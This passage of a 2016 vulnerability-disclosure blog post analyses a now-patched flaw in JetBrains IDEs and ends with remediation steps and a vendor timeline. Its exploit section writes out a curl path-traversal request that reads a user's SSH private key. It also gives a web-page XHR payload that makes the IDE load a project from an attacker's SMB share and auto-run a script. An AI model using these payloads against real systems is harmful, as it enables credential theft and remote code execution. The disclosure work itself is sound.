<p>Bingo. Now we don&rsquo;t have to guess at an open project name as we now know the <code>helpers</code> project is open. There&rsquo;s no standard location for PyCharm&rsquo;s root folder under Linux (it&rsquo;s wherever the user happened to un<code>tar</code> it to,) but we can determine it by reqesting <code>/api/about?more=true</code> and looking at the <code>homePath</code> key:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='json'><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="nt">&quot;name&quot;</span><span class="p">:</span> <span class="s2">&quot;PyCharm 2016.1.2&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="nt">&quot;productName&quot;</span><span class="p">:</span> <span class="s2">&quot;PyCharm&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="nt">&quot;baselineVersion&quot;</span><span class="p">:</span> <span class="mi">145</span><span class="p">,</span>
</span><span class='line'>  <span class="nt">&quot;buildNumber&quot;</span><span class="p">:</span> <span class="mi">844</span><span class="p">,</span>
</span><span class='line'>  <span class="nt">&quot;vendor&quot;</span><span class="p">:</span> <span class="s2">&quot;JetBrains s.r.o.&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="nt">&quot;isEAP&quot;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
</span><span class='line'>  <span class="nt">&quot;productCode&quot;</span><span class="p">:</span> <span class="s2">&quot;PY&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="nt">&quot;buildDate&quot;</span><span class="p">:</span> <span class="mi">1460098800000</span><span class="p">,</span>
</span><span class='line'>  <span class="nt">&quot;isSnapshot&quot;</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
</span><span class='line'>  <span class="nt">&quot;configPath&quot;</span><span class="p">:</span> <span class="s2">&quot;/home/user/.PyCharm2016.1/config&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="nt">&quot;systemPath&quot;</span><span class="p">:</span> <span class="s2">&quot;/home/user/.PyCharm2016.1/system&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="nt">&quot;binPath&quot;</span><span class="p">:</span> <span class="s2">&quot;/home/user/opt/pycharm/bin&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="nt">&quot;logPath&quot;</span><span class="p">:</span> <span class="s2">&quot;/home/user/.PyCharm2016.1/system/log&quot;</span><span class="p">,</span>
</span><span class='line'>  <span class="nt">&quot;homePath&quot;</span><span class="p">:</span> <span class="s2">&quot;/home/user/opt/pycharm&quot;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Once we&rsquo;ve opened the <code>helpers</code> project, we determine the user&rsquo;s home directory from the <code>/api/about?more=true</code> response and use that to construct a URL to their SSH keys like <code>/helpers/..%2f..%2f..%2f..%2f..%2f..%2fhome/&lt;user&gt;/.ssh/id_rsa</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl -v <span class="s2">&quot;http://localhost:63342/helpers/..%2f..%2f..%2f..%2f..%2f..%2fhome/user/.ssh/id_rsa&quot;</span>
</span><span class='line'>&gt; GET /helpers/..%2f..%2f..%2f..%2f..%2f..%2fhome/user/.ssh/id_rsa HTTP/1.1
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>&gt;
</span><span class='line'>&lt; HTTP/1.1 <span class="m">200</span> OK
</span><span class='line'>&lt; content-type: application/octet-stream
</span><span class='line'>&lt; server: PyCharm 5.0.4
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'>&lt;
</span><span class='line'>ssh-rsa AAAAB3NzaC<span class="o">[</span>...<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p></p>

<h2>Exploitation under Windows is much easier</h2>

<p>The above trick with opening the <code>helpers</code> directory that ships with PyCharm obviously only works if the user has PyCharm 2016.1 installed, everywhere else we still have to guess an open project name. How about something that works reliably with the other JetBrains IDEs like IntelliJ IDEA and Android Studio?</p>

<p>Since the <code>jetbrains://project/open</code> handler lets us pass a completely arbitrary path for the project to open, <a href="https://msdn.microsoft.com/en-us/library/gg465305.aspx">UNC paths</a> are an obvious choice. UNC paths are a windows-specific path form that allows you to reference files on a network share, and they like <code>\\servername\sharename\filepath</code>. Many of Windows&#8217; file APIs (and the Java APIs that wrap them) will happily take UNC paths and transparently connect to an SMB share on another computer, allowing you to read and write to the remote files as if they were local. If we can get the IDE to open a project from our SMB share, we won&rsquo;t need to guess at what projects might be on the victim&rsquo;s computer.</p>

<p>To test, I set up a remote Samba instance with an unauthenticated SMB share named &ldquo;anontesting&rdquo; that contained a JetBrains project, then tried opening it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl -v <span class="s2">&quot;http://127.0.0.1:63342/api/internal&quot;</span> --data <span class="s1">&#39;{&quot;url&quot;: &quot;jetbrains://whatever/open/\\\\smb.example.com\\anonshare\\testing&quot;}&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Great. Assuming the victim&rsquo;s ISP doesn&rsquo;t block outbound SMB traffic (due to the large number of worms that have historically propagated via SMB vulns) we can get them to load an arbitrary project from an SMB share we control.</p>

<h3>The impact under Windows is much worse</h3>

<p>Wait a second, this seems a lot more interesting than arbitrary file reads. With one request we can get Windows users to load an attacker-controlled project from our remote SMB share. There&rsquo;s almost certainly abuse potential here, and we don&rsquo;t have to look far to find it.</p>

<p>The projects for each of JetBrains&#8217; IDEs have a notion of startup tasks. In PyCharm you can have a Python script run automatically on project load, and similarly on Android Studio and IntelliJ IDEA you can have a <code>.jar</code> run. Here I&rsquo;ve made it so that <code>hax.py</code> in the project root will be automatically run when the project opens:</p>

<p><img src="/images/posts/jetbrains/startup_tasks.png"></p>

<p><img src="/images/posts/jetbrains/startup_tasks2.png"></p>

<p>With this, we just need to add a <code>hax.py</code> file to our project root containing:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'>
</span><span class='line'><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&quot;calc.exe&quot;</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>We then put the project on our anonymous SMB share, and host a page with our payload that will cause the victim to load the malicious project:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;script&gt;</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">xhr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
</span><span class='line'><span class="nx">xhr</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="s2">&quot;http://127.0.0.1:63342/api/internal&quot;</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
</span><span class='line'><span class="nx">xhr</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s1">&#39;{&quot;url&quot;: &quot;jetbrains://whatever/open/\\\\\\\\123.456.789.101\\\\anonshare\\\\testing&quot;}&#39;</span><span class="p">);</span>
</span><span class='line'><span class="nt">&lt;/script&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>As soon as the victim navigates to that page, our payload will trigger and the calculator will open:</p>

<p><img src="/images/posts/jetbrains/calc.png"></p>

<p>Decent.</p>

<h1>PoCs</h1>

<ul>
<li><a href="http://saynotolinux.com/tests/jetbrains/minimal.html">Minimal file leaking PoC</a></li>
<li><a href="http://saynotolinux.com/tests/jetbrains/sleuth.html">Weaponized file leaking PoC</a></li>
<li>No live PoC for the Windows RCE &lsquo;cause I don&rsquo;t want to host an public-facing SMB share :)</li>
</ul>


<h1>Remediation</h1>

<p>JetBrains took several steps that I&rsquo;m aware of to remediate this:</p>

<ul>
<li>All requests to the local HTTP server now require an unguessable auth token to be included in the request, or the server will return a <code>4xx</code> status code.</li>
<li>The problematic CORS policies were removed entirely</li>
<li>The <code>Host</code> header&rsquo;s value is now validated to prevent similar exploits via DNS rebinding</li>
</ul>


<h1>Vendor response</h1>

<h2>Interactions with the vendor</h2>

<p>I&rsquo;d like to specifically thank Hadi Hariri and the rest of the JetBrains team for their proactive response to my report. My email requesting a security contact was answered within an hour of my sending it, and the issue was resolved relatively quickly.</p>

<p>They sent me a patchset against <code>intellij-community</code> and a binary build with their proposed solutions, and were receptive to my feedback when I mentioned potential issues.</p>

<p>Lastly, even though Jetbrains doesn&rsquo;t have a bug bounty program that I&rsquo;m aware of, and I definitely wasn&rsquo;t expecting anything, Jetbrains quite generously awarded a bounty of $50,000 for my report and help reviewing the patch. I&rsquo;ve asked them to donate the bulk of this to the PyPy project to fund improved Python 3 support, fingers crossed for <code>await/async</code> support in PyPy :).</p>

<h2>Disclosure Timeline</h2>

<ul>
<li>2016-04-04 - Discovered the local file disclosure issue</li>
<li>2016-04-06 - Requested a security contact from the vendor</li>
<li>2016-04-06 - Vendor replies with security contact information, requests vulnerability details</li>
<li>2016-04-07 - Sent the vendor a PoC for the local file disclosure vulnerability</li>
<li>2016-04-10 - Sent the vendor a more detailed report with remediation steps and details about the RCE on Windows</li>
<li>2016-04-12 - Vendor responds that they are working on a patch</li>
<li>2016-04-14 - Vendor responds with a patch against the open-source <code>intellij-community</code> repo for review</li>
<li>2016-04-14 - Sent feedback to the vendor requesting changes to the patch, along with mitigation bypass PoCs</li>
<li>2016-04-15 - Vendor responds that they are working on an updated patch that addresses the concerns</li>
<li>2016-04-26 - Vendor indicates that they plan to release a patch soon</li>
<li>2016-05-11 - Coordinated release of security patches for all JetBrains IDEs, <a href="http://blog.jetbrains.com/blog/2016/05/11/security-update-for-intellij-based-ides-v2016-1-and-older-versions/">security advisory published</a>.</li>
</ul>

</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Jordan Milne</span></span>

      








  



<time datetime="2016-08-15T00:00:00-07:00" pubdate data-updated="true"><time class='entry-date' datetime='2016-08-15'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>15</span><span class='date-suffix'>th</span>, <span class='date-year'>2016</span></span></time></time>
      


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://blog.saynotolinux.com/blog/2016/08/15/jetbrains-ide-remote-code-execution-and-local-file-disclosure-vulnerability-analysis/" data-via="largenocream" data-counturl="http://blog.saynotolinux.com/blog/2016/08/15/jetbrains-ide-remote-code-execution-and-local-file-disclosure-vulnerability-analysis/" >Tweet</a>
  
  
  <div class="g-plusone" data-size="medium"></div>
  
  
    <div class="fb-like" data-send="true" data-width="450" data-show-faces="false"></div>
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/08/02/pastejacking-abusing-flash-to-leak-and-manipulate-clipboad-contents/" title="Previous Post: Leaking Clipboard Contents With Flash: Let's Explore User-Initiated Actions!">&laquo; Leaking Clipboard Contents With Flash: Let&#8217;s Explore User-Initiated Actions!</a>
      
      
    </p>
  </footer>
</article>

</div>

<aside class="sidebar">
  
    <section>
  <h1>About Me</h1>
  <h3>Jordan Milne</h3>
  <p>I&#8217;m a programmer with a passion for web / browser security. Most of my spare time goes towards putting something together or trying to make it come apart.</p>
  <p>I dream about timing attacks, info leaks, and same-origin policy bypasses.</p>
  <br/>
  &bull;<a href="&#109;&#x61;&#105;&#108;&#x74;&#111;&#58;&#100;&#x65;&#x66;&#x69;&#110;&#101;&#x64;&#109;&#x69;&#x73;&#x62;&#x65;&#x68;&#97;&#x76;&#105;&#x6f;&#x75;&#x72;&#x40;&#115;&#97;&#121;&#110;&#111;&#x74;&#111;&#108;&#105;&#110;&#117;&#120;&#x2e;&#x63;&#x6f;&#x6d;">Email</a><br/>
  &bull;<a href="http://www.linkedin.com/in/jordanamilne">LinkedIn</a><br/>
  </ol>
</section>
<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2016/08/15/jetbrains-ide-remote-code-execution-and-local-file-disclosure-vulnerability-analysis/">JetBrains IDE Remote Code Execution and Local File Disclosure</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/08/02/pastejacking-abusing-flash-to-leak-and-manipulate-clipboad-contents/">Leaking Clipboard Contents With Flash: Let&#8217;s Explore User-Initiated Actions!</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/12/09/seizing-control-of-yahoo-mail-cross-origin-again/">Seizing Control of Yahoo! Mail Cross-Origin&#8230; Again</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/04/12/spooky-sanitizer-stories-analyzing-the-reddit-enhancement-suite-xss-flaw/">Spooky Sanitization Stories: Analyzing the XSS Flaw in Reddit Enhancement Suite</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/03/01/yahoos-pet-show-of-horrors-abusing-a-crossdomain-proxy-to-leak-a-users-email/">Yahoo&#8217;s Pet Show of Horrors: Leaking a User&#8217;s Emails Crossdomain</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  <i>Any opinions expressed on this site are my own, and may not represent the opinions of those who, incidentally, give me money.</i>
</p>
<p>
  Copyright &copy; 2016 - Jordan Milne -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  



<div id="fb-root"></div>
<script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) {return;}
  js = d.createElement(s); js.id = id; js.async = true;
  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
  fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>



  <script type="text/javascript">
    (function() {
      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
      script.src = 'https://apis.google.com/js/plusone.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
    })();
  </script>



  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
